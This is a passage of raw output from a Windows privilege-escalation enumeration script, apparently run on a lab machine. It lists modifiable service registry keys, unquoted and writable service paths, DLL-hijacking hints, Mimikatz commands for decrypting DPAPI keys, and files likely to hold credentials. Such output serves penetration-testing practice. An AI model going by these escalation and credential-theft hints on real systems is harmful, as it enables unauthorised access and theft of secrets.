You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SerCx2                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serenum                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Serial                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sermouse                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SessionEnv                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sfloppy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SharedAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ShellHWDetection                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SiSRaid4                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smbdirect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\smphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SNMPTRAP                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\spaceport                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SpbCx                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Spooler                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sppsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srv2                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\srvnet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SSDPSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SstpSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stexstor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storahci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storflt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\stornvme                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\storvsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\svsvc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swenum                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\swprv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SysMain                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SystemEventsBroker                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TapiSrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Tcpip                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIP6TUNNEL                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tcpipreg                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TCPIPTUNNEL                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tdx                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\terminpt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TermService                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Themes                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\THREADORDER                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TieringEngineService                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TPM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TSDDD                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbFlt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\TsUsbGD                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tsusbhub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\tunnel                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uagp35                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UALSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UASPStor                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UCX01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\udfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UEFI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UI0Detect                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\uliagpkx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\umbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmPass                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UmRdpService                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\upnphost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbccgp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbehci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbhub                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBHUB3                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbohci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbprint                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBSTOR                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\usbuhci                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\USBXHCI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VaultSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vdrvroot                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vds                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VerifierExt                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vhdmp                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\viaide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Vid                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VMBusHID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmbusr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicguestinterface                           
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicheartbeat                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmickvpexchange                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicrdv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicshutdown                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmictimesync                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vmicvss                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volmgrx                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\volsnap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpci                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vpcivsp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\vsmraid                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\VSTXRAID                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W32Time                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\w3logsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\W3SVC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WacomPen                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wanarpv6                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WAS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wcmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WcsPlugInService                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wdf01000                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Wecsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WEPHOSTSVC                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wercplsupport                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WerSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WFPLWFS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WIMMount                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WindowsScheduler                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinHttpAutoProxySvc                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinMad                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winmgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinNat                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinRM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Winsock                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinSock2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WinVerbs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiAcpi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WmiApRpl                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wmiApSrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\workerdd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WPDBusEnum                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ws2ifsl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WSService                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wtlmdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wuauserv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\WudfPf                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\wudfsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\XEN                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenbus_monitor                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenfilt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xeniface                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xennet                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvbd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xenvif                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\xmlprov                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{35E1B823-1443-4A40-875E-3A1C41494DB7}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{51E2531C-2946-4F58-A4BB-072994EB3731}       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\{C7568B63-C424-48B3-AB9B-6D1F004D5AFC}       
                                                                                                                 
 [+] UNQUOTED SERVICE PATHS                                                                                      
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                                 
   [i] The permissions are also checked and filtered using icacls                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
aspnet_state                                                                                                     
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe NT SERVICE\TrustedInstaller:(F)                 
                                                                                                                 
AWSLiteAgent                                                                                                     
 C:\Program Files\Amazon\XenTools\LiteAgent.exe                                                                  
Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"                                                          
NetTcpPortSharing                                                                                                
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                   
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                    
                                                                                                                 
PerfHost                                                                                                         
 C:\Windows\SysWow64\perfhost.exe                                                                                
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                 
                                                                                                                 
PsShutdownSvc                                                                                                    
 C:\Windows\PSSDNSVC.EXE                                                                                         
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                               
                        BUILTIN\Administrators:(I)(F)                                                            
                                                                                                                 
TrustedInstaller                                                                                                 
 C:\Windows\servicing\TrustedInstaller.exe                                                                       
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                        
                                                                                                                 
WindowsScheduler                                                                                                 
 C:\PROGRA~2\SYSTEM~1\WService.exe                                                                               
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] DLL HIJACKING in PATHenv variable                                                                            
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations         
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking            
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                              
                    BUILTIN\Administrators:(M)                                                                   
                    BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                       
                                                                                                                 
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                       
           BUILTIN\Administrators:(M)                                                                            
           BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                
                                                                                                                 
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                         
                         BUILTIN\Administrators:(M)                                                              
                         BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] CREDENTIALS                                                                                                  
                                                                                                                 
 [+] WINDOWS VAULT                                                                                               
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault            
                                                                                                                 
Currently stored credentials:                                                                                    
                                                                                                                 
* NONE *                                                                                                         
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
                                                                                                                 
    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect                                          
                                                                                                                 
                                                                                                                 
Mode                LastWriteTime     Length Name                                                                
----                -------------     ------ ----                                                                
d---s         9/27/2022  11:27 AM            S-1-5-21-141259258-288879770-38949                                  
                                             83326-500                                                           
                                                                                                                 
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                              
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module         
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\                                     
                                                                                                                 
The system cannot find the batch label specified - T_Progress                                                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Local\Microsoft\Credentials\                                       
                                                                                                                 
                                                                                                                 
 [+] Unattended files                                                                                            
                                                                                                                 
 [+] SAM and SYSTEM backups                                                                                      
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
 [+] FIREWALL                                                                                                    
                                                                                                                 
Firewall status:                                                                                                 
-------------------------------------------------------------------                                              
Profile                           = Standard                                                                     
Operational mode                  = Enable                                                                       
Exception mode                    = Enable                                                                       
Multicast/broadcast response mode = Enable                                                                       
Notification mode                 = Disable                                                                      
Group policy version              = Windows Firewall                                                             
Remote admin mode                 = Disable                                                                      
                                                                                                                 
Ports currently open on all network interfaces:                                                                  
Port   Protocol  Version  Program                                                                                
-------------------------------------------------------------------                                              
No ports are currently open on all network interfaces.                                                           
                                                                                                                 
IMPORTANT: Command executed successfully.                                                                        
However, "netsh firewall" is deprecated;                                                                         
use "netsh advfirewall firewall" instead.                                                                        
For more information on using "netsh advfirewall firewall" commands                                              
instead of "netsh firewall", see KB article 947709                                                               
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                               
                                                                                                                 
                                                                                                                 
                                                                                                                 
Domain profile configuration:                                                                                    
-------------------------------------------------------------------                                              
Operational mode                  = Enable                                                                       
Exception mode                    = Enable                                                                       
Multicast/broadcast response mode = Enable                                                                       
Notification mode                 = Disable                                                                      
                                                                                                                 
Service configuration for Domain profile:                                                                        
Mode     Customized  Name                                                                                        
-------------------------------------------------------------------                                              
Enable   No          Remote Desktop                                                                              
                                                                                                                 
Allowed programs configuration for Domain profile:                                                               
Mode     Traffic direction    Name / Program                                                                     
-------------------------------------------------------------------                                              
                                                                                                                 
Port configuration for Domain profile:                                                                           
Port   Protocol  Mode    Traffic direction     Name                                                              
-------------------------------------------------------------------                                              
                                                                                                                 
ICMP configuration for Domain profile:                                                                           
Mode     Type  Description                                                                                       
-------------------------------------------------------------------                                              
Enable   2     Allow outbound packet too big                                                                     
                                                                                                                 
Standard profile configuration (current):                                                                        
-------------------------------------------------------------------                                              
Operational mode                  = Enable                                                                       
Exception mode                    = Enable                                                                       
Multicast/broadcast response mode = Enable                                                                       
Notification mode                 = Disable                                                                      
                                                                                                                 
Service configuration for Standard profile:                                                                      
Mode     Customized  Name                                                                                        
-------------------------------------------------------------------                                              
Enable   No          Remote Desktop                                                                              
                                                                                                                 
Allowed programs configuration for Standard profile:                                                             
Mode     Traffic direction    Name / Program                                                                     
-------------------------------------------------------------------                                              
                                                                                                                 
Port configuration for Standard profile:                                                                         
Port   Protocol  Mode    Traffic direction     Name                                                              
-------------------------------------------------------------------                                              
                                                                                                                 
ICMP configuration for Standard profile:                                                                         
Mode     Type  Description                                                                                       
-------------------------------------------------------------------                                              
Enable   2     Allow outbound packet too big                                                                     
                                                                                                                 
Log configuration:                                                                                               
-------------------------------------------------------------------                                              
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log                                            
Max file size   = 4096 KB                                                                                        
Dropped packets = Disable                                                                                        
Connections     = Disable                                                                                        
                                                                                                                 
IMPORTANT: Command executed successfully.                                                                        
However, "netsh firewall" is deprecated;                                                                         
use "netsh advfirewall firewall" instead.                                                                        
For more information on using "netsh advfirewall firewall" commands                                              
instead of "netsh firewall", see KB article 947709                                                               
at http://go.microsoft.com/fwlink/?linkid=121488 .                                                               
                                                                                                                 
                                                                                                                 
                                                                                                                 
 [+] ARP                                                                                                         
                                                                                                                 
Interface: 10.10.97.210 --- 0xe                                                                                  
  Internet Address      Physical Address      Type                                                               
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic                                                            
  10.10.255.255         ff-ff-ff-ff-ff-ff     static                                                             
  169.254.169.254       02-c8-85-b5-5a-aa     dynamic                                                            
  224.0.0.22            01-00-5e-00-00-16     static                                                             
  224.0.0.252           01-00-5e-00-00-fc     static                                                             
  255.255.255.255       ff-ff-ff-ff-ff-ff     static                                                             
                                                                                                                 
C:\inetpub\history\CFGHISTORY_0000000001\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000001\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000002\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000002\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000003\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000003\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000004\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000004\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000005\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000005\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000006\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000006\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000007\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000007\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000008\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000008\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000009\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000009\applicationHost.config                                                  
C:\inetpub\temp\appPools\Blog\Blog.config                                                                        
C:\inetpub\temp\appPools\DefaultAppPool\DefaultAppPool.config                                                    
C:\inetpub\wwwroot\packages.config                                                                               
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\change-password-success.aspx                                                          
C:\inetpub\wwwroot\Account\change-password.aspx                                                                  
C:\inetpub\wwwroot\Account\password-retrieval.aspx                                                               
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\Content\images\blog\icon-pass.svg                                                             
C:\inetpub\wwwroot\setup\Web.config                                                                              
C:\inetpub\wwwroot\setup\MySQL\MySQLWeb.Config                                                                   
C:\inetpub\wwwroot\setup\MySQL\Archive\MySQLWeb.Config                                                           
C:\inetpub\wwwroot\setup\SQLite\SQLiteWeb.Config                                                                 
C:\inetpub\wwwroot\setup\SQLServer\DbWeb.Config                                                                  
C:\inetpub\wwwroot\setup\SQL_CE\SQL_CE_Web.Config                                                                
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe                                                    
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\ec2config-cli.exe.config                                                
C:\Program Files\Amazon\Ec2ConfigService\ec2config-cli.log4net.config                                            
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe.config                                                    
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigMonitor.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigMonitor.log4net.config                                         
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigServiceSettings.exe.config                                     
C:\Program Files\Amazon\Ec2ConfigService\Ec2Runas.exe.config                                                     
C:\Program Files\Amazon\Ec2ConfigService\Ec2WallpaperInfo.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\log4net.config                                                          
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Plugins\log4net.config                                                  
C:\Program Files\Amazon\Ec2ConfigService\Ssm\log4net.config                                                      
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\AWS.EC2.Windows.CloudWatch.Configuration.dll               
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\log4net.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\Microsoft.Practices.Unity.Configuration.dll                
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\Microsoft.Practices.Unity.Interception.Configuration.dll   
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.CloudWatch.exe.config                                      
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.CloudWatch.log4net.config                                  
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.EC2.Windows.CloudWatch.Configuration.dll                   
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\Microsoft.Practices.Unity.Configuration.dll                    
